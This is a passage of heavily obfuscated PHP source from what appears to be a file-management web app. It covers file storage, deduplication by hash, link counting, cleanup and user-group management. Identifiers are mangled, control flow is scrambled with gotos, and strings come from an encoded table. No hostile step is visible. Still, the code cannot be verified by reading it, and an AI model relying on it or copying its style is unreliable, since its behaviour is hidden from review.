$BÄâÚ¯»íø, $få¦¿»¬ÁÛ); goto cÜ¨ò¬Ëï; cÜ¨ò¬Ëï: $A°À¥„§ˆ = $fÎ‹“Ç›Ï->pathFather($AË×…‚µŸ²); static $Cô£ÙºÚÎß = false; $b«óÇâÓœ = $eÌˆàÒŞÄˆ[1740] . md5($A°À¥„§ˆ); goto Bñî¢’Ÿ½Š; e ¢ÂŸ±¼­: } public function makeFilePath($c’±ÀÌ„¿¹, $E†‚ÇÏùáö, $cç–ÃöÄˆŠ = false, $bÌ¿››áŒÁ = false) { goto B¥‡Äßõ; B¥‡Äßõ: $e¿Å®¨²îé =& $_SERVER[Ü˜]; $EœÁ‰®ô„ = Model($e¿Å®¨²îé[739])->get($e¿Å®¨²îé[1741]); $FÃ¼öƒèÕø = KodIO::defaultIO() . date($e¿Å®¨²îé[1742]); goto cê„§ä‡ˆ; cê„§ä‡ˆ: $Cˆİ³†Áâ¥ = $FÃ¼öƒèÕø . rand_string(5) . short_id(100); $c’±ÀÌ„¿¹ = str_replace($e¿Å®¨²îé[8], $e¿Å®¨²îé[81], KodIO::clear($c’±ÀÌ„¿¹)); $aÇÎÕÂ× = $E†‚ÇÏùáö->ext($c’±ÀÌ„¿¹); goto b¡¨³­·ğ; b¡¨³­·ğ: if (!$c’±ÀÌ„¿¹) { $EœÁ‰®ô„ = $e¿Å®¨²îé[1743]; } switch ($EœÁ‰®ô„) { case $e¿Å®¨²îé[1744]: $Cˆİ³†Áâ¥ = $Cˆİ³†Áâ¥ . $e¿Å®¨²îé[105] . $E†‚ÇÏùáö->ext($c’±ÀÌ„¿¹); if ($aÇÎÕÂ× == $e¿Å®¨²îé[1683]) { $Cˆİ³†Áâ¥ .= $e¿Å®¨²îé[1431]; } break; case $e¿Å®¨²îé[1745]: goto cöÎ¥ƒ°Õ¡; cöÎ¥ƒ°Õ¡: $A™—²Œ¡„ = Model($e¿Å®¨²îé[739])->get($e¿Å®¨²îé[740]); $B¨Œ’È³Ùä = substr(md5($e¿Å®¨²îé[741] . $A™—²Œ¡„ . date($e¿Å®¨²îé[717])), 0, 8); $céàÜ³»£É = KodIO::defaultDriver(); goto EÒé Æ¸“á; EÒé Æ¸“á: $FÃ¼öƒèÕø = $e¿Å®¨²îé[1125] . $céàÜ³»£É[$e¿Å®¨²îé[402]] . $e¿Å®¨²îé[411] . date($e¿Å®¨²îé[1746]) . $B¨Œ’È³Ùä . $e¿Å®¨²îé[8]; if ($aÇÎÕÂ× == $e¿Å®¨²îé[1683]) { $c’±ÀÌ„¿¹ .= $e¿Å®¨²îé[1431]; } $EâšëŠé¥ = $e¿Å®¨²îé[1747] . $FÃ¼öƒèÕø . $c’±ÀÌ„¿¹; goto e†Ÿ§ñ„; dšö’¦áœ: if (IO::isTypeObject($Cˆİ³†Áâ¥) && !IO::isUploadServer($Cˆİ³†Áâ¥)) { if (IO::exist($Cˆİ³†Áâ¥)) { return $Cˆİ³†Áâ¥; } $BµùÚ§º‚Æ = IO::setContent($Cˆİ³†Áâ¥, $e¿Å®¨²îé[33]); if (!$BµùÚ§º‚Æ) { show_json($e¿Å®¨²îé[1748], !1); } } CacheLock::unlock($EâšëŠé¥); break; goto E÷¿ñ•ìÀø; e†Ÿ§ñ„: CacheLock::lock($EâšëŠé¥); $Cˆİ³†Áâ¥ = $FÃ¼öƒèÕø . $c’±ÀÌ„¿¹; if (IO::exist($FÃ¼öƒèÕø . $c’±ÀÌ„¿¹)) { $FƒòÓÄÙ”ª = substr($c’±ÀÌ„¿¹, 0, strlen($c’±ÀÌ„¿¹) - strlen($aÇÎÕÂ×)); $e²¿ë¦¢‘¿ = $bÌ¿››áŒÁ ? substr($bÌ¿››áŒÁ, 0, 5) : ($cç–ÃöÄˆŠ ? substr($cç–ÃöÄˆŠ, 0, 5) : rand_string(5)); $Cˆİ³†Áâ¥ = $FÃ¼öƒèÕø . $FƒòÓÄÙ”ª . $e²¿ë¦¢‘¿ . $e¿Å®¨²îé[105] . $aÇÎÕÂ×; } goto dšö’¦áœ; E÷¿ñ•ìÀø: case $e¿Å®¨²îé[1743]: break; default: break; } return $Cˆİ³†Áâ¥; goto Cˆ³‰°ÜÒä; Cˆ³‰°ÜÒä: } public function addFileByRemote($c…Àä¿›¯¶, $E¸ï›é £Š, $eÕƒéèÔÎ = array()) { goto d÷´Ç•ÕÍ‹; d÷´Ç•ÕÍ‹: $FŒÆ¾¸›‹œ =& $_SERVER[Ü˜]; if (!IO::exist($c…Àä¿›¯¶)) { return !1; } $DËà’¿×É£ = $eÕƒéèÔÎ[$FŒÆ¾¸›‹œ[180]] ? $eÕƒéèÔÎ[$FŒÆ¾¸›‹œ[180]] : $FŒÆ¾¸›‹œ[33]; goto cÎÄÚšå ; FİâÔñ©ƒç: if ($f¢Àƒ¶½È = $this->addFileCheckExist($d¶˜ïáã‚”[$FŒÆ¾¸›‹œ[181]], $d¶˜ïáã‚”[$FŒÆ¾¸›‹œ[180]], $d¶˜ïáã‚”[$FŒÆ¾¸›‹œ[88]])) { return $f¢Àƒ¶½È; } return $this->addFileData($d¶˜ïáã‚”); goto c†ÙšíÏ; cÎÄÚšå : $fšÂ¥¥ß¯¨ = IO::hashMd5($c…Àä¿›¯¶, $DËà’¿×É£); $a¯½†ÖóÍÖ = KodIO::defaultDriver(); $d¶˜ïáã‚” = array($FŒÆ¾¸›‹œ[557] => IO::size($c…Àä¿›¯¶), $FŒÆ¾¸›‹œ[1749] => 1, $FŒÆ¾¸›‹œ[422] => $E¸ï›é £Š, $FŒÆ¾¸›‹œ[782] => $a¯½†ÖóÍÖ[$FŒÆ¾¸›‹œ[402]], $FŒÆ¾¸›‹œ[423] => $c…Àä¿›¯¶, $FŒÆ¾¸›‹œ[1750] => $eÕƒéèÔÎ[$FŒÆ¾¸›‹œ[181]] ? $eÕƒéèÔÎ[$FŒÆ¾¸›‹œ[181]] : IO::hashSimple($c…Àä¿›¯¶), $FŒÆ¾¸›‹œ[1751] => $fšÂ¥¥ß¯¨ ? $fšÂ¥¥ß¯¨ : $DËà’¿×É£); goto FİâÔñ©ƒç; c†ÙšíÏ: } private function addFileData($d¶£‘ùö¹Ş) { $aÇâÇ¿ò†¯ =& $_SERVER[Ü˜]; if (!$d¶£‘ùö¹Ş) { return !1; } $d¶£‘ùö¹Ş[$aÇâÇ¿ò†¯[88]] = intval($d¶£‘ùö¹Ş[$aÇâÇ¿ò†¯[88]]); if (!$d¶£‘ùö¹Ş[$aÇâÇ¿ò†¯[88]] && strlen($d¶£‘ùö¹Ş[$aÇâÇ¿ò†¯[181]]) > 32) { $d¶£‘ùö¹Ş[$aÇâÇ¿ò†¯[88]] = intval(substr($d¶£‘ùö¹Ş[$aÇâÇ¿ò†¯[181]], 32)); } $e÷§ö†¹Ö¢ = $this->add($d¶£‘ùö¹Ş); return $this->find($e÷§ö†¹Ö¢); } public function addFile($A‰÷ºå…‡Ú, $eÉöó¼§İ†, $F…å¿ÏŸï¾ = false) { goto EâÂÚÍ‚”; EâÂÚÍ‚”: $F­ÍÆ•ùÜ¼ = IO::hashSimple($A‰÷ºå…‡Ú); $fÅ±Ù‹êäì = IO::hashMd5($A‰÷ºå…‡Ú); $AÉË†ïÁ¢Ø = IO::size($A‰÷ºå…‡Ú); goto A‡õäİ‰¸Ë; bÓ£™Ú“È¾: $Cùæ–œ±„ê = $this->addFileMake($A‰÷ºå…‡Ú, $AÉË†ïÁ¢Ø, $F­ÍÆ•ùÜ¼, $fÅ±Ù‹êäì, $eÉöó¼§İ†, $F…å¿ÏŸï¾); $aÔï¶¾„Ã¾ = $this->addFileData($Cùæ–œ±„ê); CacheLock::unlock($B’†’Êæ›); goto F…Í½İ‚Ğ; F…Í½İ‚Ğ: return $aÔï¶¾„Ã¾; goto f§•ƒ©İë·; A‡õäİ‰¸Ë: $B’†’Êæ› = $_SERVER[Ü˜][1752] . $fÅ±Ù‹êäì; CacheLock::lock($B’†’Êæ›); if ($EÖ…åäš«Ù = $this->addFileCheckExist($F­ÍÆ•ùÜ¼, $fÅ±Ù‹êäì, $AÉË†ïÁ¢Ø)) { CacheLock::unlock($B’†’Êæ›); return $EÖ…åäš«Ù; } goto bÓ£™Ú“È¾; f§•ƒ©İë·: } public function addFileMake($cëÖ®–¤Å», $DˆæÇœááí, $D›èÒ®©ó’, $b¹ó¿ß£ì–, $C ˆ‚éğğ§, $C­í‡­Ë¦‡) { goto dÈµËØÔÅ¼; d‰Ì›Ñ‚¡£: $E‚ÄË¦ó“œ = get_path_this($aÈ„Õ´­ˆò); if ($C­í‡­Ë¦‡) { $A£óÅÑ¦ê— = IO::move($cëÖ®–¤Å», $f£œ‚áË¦œ, !1, $E‚ÄË¦ó“œ); } else { $A£óÅÑ¦ê— = IO::copy($cëÖ®–¤Å», $f£œ‚áË¦œ, !1, $E‚ÄË¦ó“œ); } if (!$A£óÅÑ¦ê—) { return !1; } goto EÍä¹ëë´Ø; dÈµËØÔÅ¼: $BˆÅ‡Î°ÇÃ =& $_SERVER[Ü˜]; $aÈ„Õ´­ˆò = $this->createFileName($C ˆ‚éğğ§, $D›èÒ®©ó’, $b¹ó¿ß£ì–); $f£œ‚áË¦œ = get_path_father($aÈ„Õ´­ˆò); goto d‰Ì›Ñ‚¡£; EÍä¹ëë´Ø: $cåÅ¾‹†´¶ = KodIO::defaultDriver(); $Fù´ß÷Ï„À = array($BˆÅ‡Î°ÇÃ[557] => $DˆæÇœááí, $BˆÅ‡Î°ÇÃ[1749] => 1, $BˆÅ‡Î°ÇÃ[422] => $C ˆ‚éğğ§, $BˆÅ‡Î°ÇÃ[782] => $cåÅ¾‹†´¶[$BˆÅ‡Î°ÇÃ[402]], $BˆÅ‡Î°ÇÃ[423] => $aÈ„Õ´­ˆò, $BˆÅ‡Î°ÇÃ[1750] => $D›èÒ®©ó’, $BˆÅ‡Î°ÇÃ[1751] => $b¹ó¿ß£ì–); return $Fù´ß÷Ï„À; goto aé¡â¹Ÿ£ô; aé¡â¹Ÿ£ô: } public function addFileCheckExist($Eå¼ö†æé, $Bï©¹Ğ¥öæ, $A®Ô§£›¹²) { $Fë·§Š¥ÉÛ =& $_SERVER[Ü˜]; $cÆ·ª§åÇ = $this->findByHash($Eå¼ö†æé, $Bï©¹Ğ¥öæ); if (!$cÆ·ª§åÇ) { return !1; } $b›ŠŞƒ†‚² = array($Fë·§Š¥ÉÛ[1749] => intval($cÆ·ª§åÇ[$Fë·§Š¥ÉÛ[1753]]) + 1, $Fë·§Š¥ÉÛ[557] => $A®Ô§£›¹²); $this->where(array($Fë·§Š¥ÉÛ[457] => $cÆ·ª§åÇ[$Fë·§Š¥ÉÛ[456]]))->save($b›ŠŞƒ†‚²); return $cÆ·ª§åÇ; } public function remove($d×¥ªŸ¤ÄÆ) { $this->linkCountChange($d×¥ªŸ¤ÄÆ, !1); $this->clearEmpty(); return !0; } public function linkAdd($b³ŠŒœ„©®) { $this->linkCountChange($b³ŠŒœ„©®, !0); } public function linkCountChange($FİŠ£›á, $BÅê§²) { goto e‡Íàæ×‡ğ; bĞÀ†±ˆåÔ: foreach ($eöÓ•Öíß™ as $aøßí…Üì => $bø±ä§ÛŠÍ) { $eÂ©óçÖŒ® = $bø±ä§ÛŠÍ . $fÔùîŸ½™‹[33]; if (!$ešö§¬ŸŞ[$eÂ©óçÖŒ®]) { $ešö§¬ŸŞ[$eÂ©óçÖŒ®] = array(); } $ešö§¬ŸŞ[$eÂ©óçÖŒ®][] = $aøßí…Üì; } foreach ($ešö§¬ŸŞ as $bø±ä§ÛŠÍ => $eØÅé‡¤Ö) { if (!$eØÅé‡¤Ö) { continue; } $bø±ä§ÛŠÍ = $BÅê§² ? $bø±ä§ÛŠÍ : -intval($bø±ä§ÛŠÍ); $DŒÆ£³‘Ç = array($fÔùîŸ½™‹[456] => array($fÔùîŸ½™‹[7], $eØÅé‡¤Ö)); if ($bø±ä§ÛŠÍ < 0) { $DŒÆ£³‘Ç[$fÔùîŸ½™‹[1753]] = array($fÔùîŸ½™‹[973], abs($bø±ä§ÛŠÍ)); } $this->where($DŒÆ£³‘Ç)->setAdd($fÔùîŸ½™‹[1753], $bø±ä§ÛŠÍ); } goto b¶ßßÓºË; e‡Íàæ×‡ğ: $fÔùîŸ½™‹ =& $_SERVER[Ü˜]; if (!$FİŠ£›á) { return; } if (!is_array($FİŠ£›á)) { $FİŠ£›á = array($FİŠ£›á); } goto f§ˆäÀğ; f§ˆäÀğ: $eöÓ•Öíß™ = array(); foreach ($FİŠ£›á as $aøßí…Üì) { $eÂ©óçÖŒ® = $aøßí…Üì . $fÔùîŸ½™‹[33]; if (!$eöÓ•Öíß™[$eÂ©óçÖŒ®]) { $eöÓ•Öíß™[$eÂ©óçÖŒ®] = 0; } $eöÓ•Öíß™[$eÂ©óçÖŒ®]++; } $ešö§¬ŸŞ = array(); goto bĞÀ†±ˆåÔ; b¶ßßÓºË: } public function findByHash($c¨ÈïÒì§¿, $bòÓæ±‚¹® = false) { $Cİ’—‡­ˆæ =& $_SERVER[Ü˜]; if (!$c¨ÈïÒì§¿ && !$bòÓæ±‚¹®) { return !1; } $D–¼¡ìÑƒ¶ = array($Cİ’—‡­ˆæ[1750] => $c¨ÈïÒì§¿); if ($bòÓæ±‚¹®) { $D–¼¡ìÑƒ¶ = array($Cİ’—‡­ˆæ[1751] => $bòÓæ±‚¹®); } return $this->order($Cİ’—‡­ˆæ[1754])->where($D–¼¡ìÑƒ¶)->find(); } public function clearEmpty($cõ¶¶æ¿Ë° = 0) { goto d°†òÜ; d‹¥ø²¥ˆÂ: $eÀ˜çƒ½Šˆ = $this->where($eØ¸…í¢œ)->select(); if (!$eÀ˜çƒ½Šˆ) { return; } $AÁ×ÏÏ‚ÔÅ = new Task($F†èí‹àöÓ[1756], $F†èí‹àöÓ[33], count($eÀ˜çƒ½Šˆ)); goto C£¹ƒ”è÷; d°†òÜ: $F†èí‹àöÓ =& $_SERVER[Ü˜]; $A¹ÜˆÉ†ÌĞ = time() - 3600 * 24 * $cõ¶¶æ¿Ë°; $eØ¸…í¢œ = $F†èí‹àöÓ[1755] . $A¹ÜˆÉ†ÌĞ; goto d‹¥ø²¥ˆÂ; C£¹ƒ”è÷: foreach ($eÀ˜çƒ½Šˆ as $FëÉ‡ŞêÉ) { $AÁ×ÏÏ‚ÔÅ->update(1); $this->resetFile($FëÉ‡ŞêÉ); } $AÁ×ÏÏ‚ÔÅ->end(); goto Eì©ˆî¬¥ó; Eì©ˆî¬¥ó: } public function resetFile($Dìñ¥‰Ùáî) { goto eÃ£Öİ•‡¤; eÃ£Öİ•‡¤: $e†ƒ¬˜ÃÆ¼ =& $_SERVER[Ü˜]; $eëÅÒ™§È¯ = array($e†ƒ¬˜ÃÆ¼[457] => $Dìñ¥‰Ùáî[$e†ƒ¬˜ÃÆ¼[456]]); $b†ÁÉ²ÔˆÙ = Model($e†ƒ¬˜ÃÆ¼[1207])->where($eëÅÒ™§È¯)->count(); goto AŠÚ İ‘“Ú; AŠÚ İ‘“Ú: $Bª•‚ö¿Ú = Model($e†ƒ¬˜ÃÆ¼[1757])->where($eëÅÒ™§È¯)->count(); $C·£´Œâ“ = intval($b†ÁÉ²ÔˆÙ) + intval($Bª•‚ö¿Ú); if ($C·£´Œâ“ == 0) { IO::remove($Dìñ¥‰Ùáî[$e†ƒ¬˜ÃÆ¼[86]]); Model($e†ƒ¬˜ÃÆ¼[1758])->delete($Dìñ¥‰Ùáî[$e†ƒ¬˜ÃÆ¼[456]]); $this->where($eëÅÒ™§È¯)->delete(); $this->metaSet($Dìñ¥‰Ùáî[$e†ƒ¬˜ÃÆ¼[456]], null, null); return; } goto E¥†¡·¾´İ; E¥†¡·¾´İ: if ($Dìñ¥‰Ùáî[$e†ƒ¬˜ÃÆ¼[1753]] != $C·£´Œâ“) { $this->where($eëÅÒ™§È¯)->save(array($e†ƒ¬˜ÃÆ¼[1749] => $C·£´Œâ“)); } goto bæÛ×½£˜ ; bæÛ×½£˜ : } public function storageInfo($a‹‰•ƒ´ôŒ = false) { goto Dëå­»½ÛÚ; Dëå­»½ÛÚ: $aÀÍ»×² =& $_SERVER[Ü˜]; $dŞ‡¿ïî§ = $this->count() + 0.0; $E§¶¥¡‘Ñ‘ = 0; goto b”«Ìå·×ç; b”«Ìå·×ç: $d©İ®¨ôÅ“ = 1; $AßÊøË‡Ñô = 0; $d”¢èÉ†¬à = 5000; goto Cç²ó›¥Õ; Cç²ó›¥Õ: for ($AˆÙ„‘“¥Ï = 0; $AˆÙ„‘“¥Ï < $dŞ‡¿ïî§; $AˆÙ„‘“¥Ï = $AˆÙ„‘“¥Ï + $d”¢èÉ†¬à) { $d»«Ç’ë¤ = $this->limit($AˆÙ„‘“¥Ï, $AˆÙ„‘“¥Ï + $d”¢èÉ†¬à)->select(); foreach ($d»«Ç’ë¤ as $CøŞ²¦Ñê×) { $d©İ®¨ôÅ“ += $CøŞ²¦Ñê×[$aÀÍ»×²[88]] * $CøŞ²¦Ñê×[$aÀÍ»×²[1753]]; $E§¶¥¡‘Ñ‘ += $CøŞ²¦Ñê×[$aÀÍ»×²[88]] * ($CøŞ²¦Ñê×[$aÀÍ»×²[1753]] - 1); $AßÊøË‡Ñô += $CøŞ²¦Ñê×[$aÀÍ»×²[1753]]; } } $dä»… ˆŒˆ = array($aÀÍ»×²[1759] => $d©İ®¨ôÅ“, $aÀÍ»×²[1760] => $E§¶¥¡‘Ñ‘, $aÀÍ»×²[1761] => $E§¶¥¡‘Ñ‘ / $d©İ®¨ôÅ“, $aÀÍ»×²[92] => $dŞ‡¿ïî§, $aÀÍ»×²[1762] => $AßÊøË‡Ñô); return $dä»… ˆŒˆ; goto d‰ˆ·¥Õ‹; d‰ˆ·¥Õ‹: } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\165\160"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\141\x6d\x65" => "\x67\162\x6f\165\160\x5f\155\x65\164\x61", "\x6d\x65\164\141\106\x69\x65\x6c\144" => "\147\162\x6f\165\x70\x49\x44"); protected function cacheFunctionAlias($bä¥•Œ¯†˜) { $F“Ò¿âá¾¬ =& $_SERVER[Ü˜]; return array($F“Ò¿âá¾¬[1763] => array($bä¥•Œ¯†˜[0], $F“Ò¿âá¾¬[1764]), $F“Ò¿âá¾¬[1765] => array($bä¥•Œ¯†˜[0], $F“Ò¿âá¾¬[1764])); } protected function getInfo($DÎÄ•ƒö÷‹) { $E ÖĞÛŞ‹ = $this->getInfoSimple($DÎÄ•ƒö÷‹); if (!$E ÖĞÛŞ‹) { return !1; } return $this->_listDataApplyItem($E ÖĞÛŞ‹); } protected function getInfoSimple($BˆæŞ§Áˆœ, $fŒğ½¨†¤é = false) { $Cñ÷£ô’Ø =& $_SERVER[Ü˜]; if ($fŒğ½¨†¤é) { $FğâÖ‘²ª– = array($Cñ÷£ô’Ø[1693] => intval($BˆæŞ§Áˆœ)); $EÑ‡¿Ï«¤¨ = $this->where($FğâÖ‘²ª–)->find(); return is_array($EÑ‡¿Ï«¤¨) ? $EÑ‡¿Ï«¤¨ : array(); } return $this->cacheFunctionGet($Cñ÷£ô’Ø[1766], $BˆæŞ§Áˆœ); } protected function groupAdd($aœ”™ùƒ‘) { goto bò‹¾©Ì²¦; aŒ‚©–¨·İ: if (!empty($aœ”™ùƒ‘[$aÒŠÏŠ‰¼[1693]])) { $aÃø¢´‰Œ[$aÒŠÏŠ‰¼[1693]] = $aœ”™ùƒ‘[$aÒŠÏŠ‰¼[1693]]; } $dáİœöĞ—½ = $this->add($aÃø¢´‰Œ); $this->setNamePinyin($dáİœöĞ—½, $aÃø¢´‰Œ[$aÒŠÏŠ‰¼[28]]); goto a¡”Àâœ–; a¡”Àâœ–: if (isset($aœ”™ùƒ‘[$aÒŠÏŠ‰¼[1769]])) { $this->metaSet($dáİœöĞ—½, array($aÒŠÏŠ‰¼[1769] => $aœ”™ùƒ‘[$aÒŠÏŠ‰¼[1769]], $aÒŠÏŠ‰¼[1770] => $aœ”™ùƒ‘[$aÒŠÏŠ‰¼[1770]])); unset($aœ”™ùƒ‘[$aÒŠÏŠ‰¼[1769]]); unset($aœ”™ùƒ‘[$aÒŠÏŠ‰¼[1770]]); } Model($aÒŠÏŠ‰¼[1207])->groupRootAdd($dáİœöĞ—½); return $dáİœöĞ—½; goto A¤‰òÕ; bò‹¾©Ì²¦: $aÒŠÏŠ‰¼ =& $_SERVER[Ü˜]; if (!$aœ”™ùƒ‘[$aÒŠÏŠ‰¼[487]] && isset($aœ”™ùƒ‘[$aÒŠÏŠ‰¼[1693]]) && $aœ”™ùƒ‘[$aÒŠÏŠ‰¼[1693]] == 1) { if ($b†‘Åª‚¦Ø = $this->getInfoSimple($aœ”™ùƒ‘[$aÒŠÏŠ‰¼[1693]], !0)) { return $aœ”™ùƒ‘[$aÒŠÏŠ‰¼[1693]]; } } else { $b†‘Åª‚¦Ø = $this->getInfoSimple($aœ”™ùƒ‘[$aÒŠÏŠ‰¼[487]]); if (!$b†‘Åª‚¦Ø) { return !1; } } $dô«ÛòŒù = $aÒŠÏŠ‰¼[507]; goto FË˜ğ·Ó¬; FË˜ğ·Ó¬: if ($b†‘Åª‚¦Ø[$aÒŠÏŠ‰¼[496]]) { $dô«ÛòŒù = $b†‘Åª‚¦Ø[$aÒŠÏŠ‰¼[496]] . $b†‘Åª‚¦Ø[$aÒŠÏŠ‰¼[1693]] . $aÒŠÏŠ‰¼[47]; } $aÃø¢´‰Œ = array($aÒŠÏŠ‰¼[422] => $this->groupNameAuto($aœ”™ùƒ‘[$aÒŠÏŠ‰¼[487]], $aœ”™ùƒ‘[$aÒŠÏŠ‰¼[28]]), $aÒŠÏŠ‰¼[403] => $aœ”™ùƒ‘[$aÒŠÏŠ‰¼[487]], $aÒŠÏŠ‰¼[562] => $dô«ÛòŒù, $aÒŠÏŠ‰¼[1767] => $aœ”™ùƒ‘[$aÒŠÏŠ‰¼[1677]], $aÒŠÏŠ‰¼[1768] => 0, $aÒŠÏŠ‰¼[1697] => 0); if (isset($aœ”™ùƒ‘[$aÒŠÏŠ‰¼[1716]])) { $aÃø¢´‰Œ[$aÒŠÏŠ‰¼[1716]] = $aœ”™ùƒ‘[$aÒŠÏŠ‰¼[1716]]; } else { $cñ£ƒ©®å = $this->max($aÒŠÏŠ‰¼[1716]); if (!$cñ£ƒ©®å) { $cñ£ƒ©®å = 0; } $aÃø¢´‰Œ[$aÒŠÏŠ‰¼[1716]] = $cñ£ƒ©®å + 1; } goto aŒ‚©–¨·İ; A¤‰òÕ: } protected function groupEdit($c¶˜å…ò¹, $fÇ’Â–ÔÚ) { goto F–ßšÌ¿´Ô; bœöÅî®­: if (isset($fÇ’Â–ÔÚ[$FŞ½˜£Â­[28]]) && $fÇ’Â–ÔÚ[$FŞ½˜£Â­[28]] != $DŒ†ã¿İâå[$FŞ½˜£Â­[28]]) { $this->_clearChildrenCache($DŒ†ã¿İâå); } return $this->where(array($FŞ½˜£Â­[1771] => $c¶˜å…ò¹))->save($fÇ’Â–ÔÚ); goto Cæ’›‡Ø‚®; cÊ…ÄÊ¾º¨: if (!empty($fÇ’Â–ÔÚ[$FŞ½˜£Â­[487]])) { $bíÈ‹Ä•¸ = $this->getInfoSimple($fÇ’Â–ÔÚ[$FŞ½˜£Â­[487]]); if (!$bíÈ‹Ä•¸) { return !1; } if ($DŒ†ã¿İâå[$FŞ½˜£Â­[1693]] == $bíÈ‹Ä•¸[$FŞ½˜£Â­[1693]]) { return !1; } if ($fÇ’Â–ÔÚ[$FŞ½˜£Â­[487]] != $DŒ†ã¿İâå[$FŞ½˜£Â­[487]]) { if ($bíÈ‹Ä•¸[$FŞ½˜£Â­[496]] !== $DŒ†ã¿İâå[$FŞ½˜£Â­[496]] && strpos($bíÈ‹Ä•¸[$FŞ½˜£Â­[496]], $DŒ†ã¿İâå[$FŞ½˜£Â­[496]] . $DŒ†ã¿İâå[$FŞ½˜£Â­[1693]] . $FŞ½˜£Â­[47]) === 0) { return !1; } $fÇ’Â–ÔÚ[$FŞ½˜£Â­[562]] = $bíÈ‹Ä•¸[$FŞ½˜£Â­[496]] . $fÇ’Â–ÔÚ[$FŞ½˜£Â­[487]] . $FŞ½˜£Â­[47]; $this->_changeChildLevel($DŒ†ã¿İâå, $bíÈ‹Ä•¸); } } if (isset($fÇ’Â–ÔÚ[$FŞ½˜£Â­[28]])) { $this->setNamePinyin($c¶˜å…ò¹, $fÇ’Â–ÔÚ[$FŞ½˜£Â­[28]]); } if (isset($fÇ’Â–ÔÚ[$FŞ½˜£Â­[1769]])) { $this->metaSet($c¶˜å…ò¹, array($FŞ½˜£Â­[1769] => $fÇ’Â–ÔÚ[$FŞ½˜£Â­[1769]], $FŞ½˜£Â­[1770] => $fÇ’Â–ÔÚ[$FŞ½˜£Â­[1770]])); unset($fÇ’Â–ÔÚ[$FŞ½˜£Â­[1769]]); unset($fÇ’Â–ÔÚ[$FŞ½˜£Â­[1770]]); } goto bœöÅî®­; F–ßšÌ¿´Ô: $FŞ½˜£Â­ =& $_SERVER[Ü˜]; $DŒ†ã¿İâå = $this->getInfoSimple($c¶˜å…ò¹); if (!$DŒ†ã¿İâå) { return !1; } goto cÊ…ÄÊ¾º¨; Cæ’›‡Ø‚®: } private function _clearChildrenCache($fÆÚÄîàˆ) { $a˜Á•‘±è„ =& $_SERVER[Ü˜]; $a‚ö÷Ò¤ÚÂ = array($a˜Á•‘±è„[562] => array($a˜Á•‘±è„[521], $fÆÚÄîàˆ[$a˜Á•‘±è„[496]] . $fÆÚÄîàˆ[$a˜Á•‘±è„[1693]] . $a˜Á•‘±è„[522])); $dÀ…Èà¼õŞ = $this->field($a˜Á•‘±è„[1693])->where($a‚ö÷Ò¤ÚÂ)->select(); foreach ($dÀ…Èà¼õŞ as $aÇ–ÓÕé÷) { $this->cacheFunctionClear($a˜Á•‘±è„[1772], $aÇ–ÓÕé÷[$a˜Á•‘±è„[1693]]); $this->cacheFunctionClear($a˜Á•‘±è„[1766], $aÇ–ÓÕé÷[$a˜Á•‘±è„[1693]]); } } private function _changeChildLevel($e¨®Ö¨ÆÀ‚, $d¿¤Í“±±, $EÓ­Ñ•»øï = false) { goto eÉãó‹ÂîÑ; eÉãó‹ÂîÑ: $bÆƒÃ¤ÆÂœ =& $_SERVER[Ü˜]; $bÑ›Ôâ¢¥ = $e¨®Ö¨ÆÀ‚[$bÆƒÃ¤ÆÂœ[496]] . $e¨®Ö¨ÆÀ‚[$bÆƒÃ¤ÆÂœ[1693]] . $bÆƒÃ¤ÆÂœ[47]; $C‘†ÚˆÇò = $d¿¤Í“±±[$bÆƒÃ¤ÆÂœ[496]] . $d¿¤Í“±±[$bÆƒÃ¤ÆÂœ[1693]] . $bÆƒÃ¤ÆÂœ[47] . $e¨®Ö¨ÆÀ‚[$bÆƒÃ¤ÆÂœ[1693]] . $bÆƒÃ¤ÆÂœ[47]; goto d‡¶Üæ¥œ«; d‡¶Üæ¥œ«: if ($EÓ­Ñ•»øï) { $C‘†ÚˆÇò = $d¿¤Í“±±[$bÆƒÃ¤ÆÂœ[496]] . $d¿¤Í“±±[$bÆƒÃ¤ÆÂœ[1693]] . $bÆƒÃ¤ÆÂœ[47]; } $cÅ‡ğñ‡†à = array($bÆƒÃ¤ÆÂœ[562] => array($bÆƒÃ¤ÆÂœ[521], $e¨®Ö¨ÆÀ‚[$bÆƒÃ¤ÆÂœ[496]] . $e¨®Ö¨ÆÀ‚[$bÆƒÃ¤ÆÂœ[1693]] . $bÆƒÃ¤ÆÂœ[522])); $CƒÉÃ¸‘ æ = array($bÆƒÃ¤ÆÂœ[562] => array($bÆƒÃ¤ÆÂœ[570], "\x72\145\160\x6c\x61\143\145\50\160\x61\x72\145\156\x74\x4c\x65\166\x65\x6c\54\47{$bÑ›Ôâ¢¥}\47\54\47{$C‘†ÚˆÇò}\x27\x29")); goto dÜšõèº·Á; dÜšõèº·Á: $this->_clearChildrenCache($e¨®Ö¨ÆÀ‚); $this->where($cÅ‡ğñ‡†à)->data($CƒÉÃ¸‘ æ)->save(); goto dæªí‰ÂîÙ; dæªí‰ÂîÙ: } public function setNamePinyin($d¸¹‚®õŠ’, $eÍâ§Ù¶İ = false) { $AÎàã®¨§è =& $_SERVER[Ü˜]; if (!$eÍâ§Ù¶İ) { $e‚Ò¯Èğ¸ = $this->getInfoSimple($d¸¹‚®õŠ’); $eÍâ§Ù¶İ = $e‚Ò¯Èğ¸[$AÎàã®¨§è[28]]; } if (!Input::check($eÍâ§Ù¶İ, $AÎàã®¨§è[565])) { $this->metaSet($d¸¹‚®õŠ’, $AÎàã®¨§è[453], null); $this->metaSet($d¸¹‚®õŠ’, $AÎàã®¨§è[452], null); return; } $bñ„ªÄÊ = array($AÎàã®¨§è[453] => str_replace($AÎàã®¨§è[50], $AÎàã®¨§è[33], Pinyin::encode($eÍâ§Ù¶İ)), $AÎàã®¨§è[452] => Pinyin::encode($eÍâ§Ù¶İ, $AÎàã®¨§è[566])); $this->metaSet($d¸¹‚®õŠ’, $bñ„ªÄÊ); } protected function groupStatus($e†ÜŠÔ„‰ê, $b™¯¸Ã–ª) { goto d®İì­ªšö; d®İì­ªšö: $bÅ¥ÜºèŸÎ =& $_SERVER[Ü˜]; $e©…ÌÒ¦Ÿó = $this->getInfoSimple($e†ÜŠÔ„‰ê); if (!$e©…ÌÒ¦Ÿó) { return !1; } goto d¦Ñ·¯šğ; AÇù¯ùÒ·ˆ: foreach ($bÓÇêè ‚Ÿ as $e†ÜŠÔ„‰ê) { $a÷ìĞĞËÃÍ[] = array($bÅ¥ÜºèŸÎ[1693] => $e†ÜŠÔ„‰ê, $bÅ¥ÜºèŸÎ[103] => 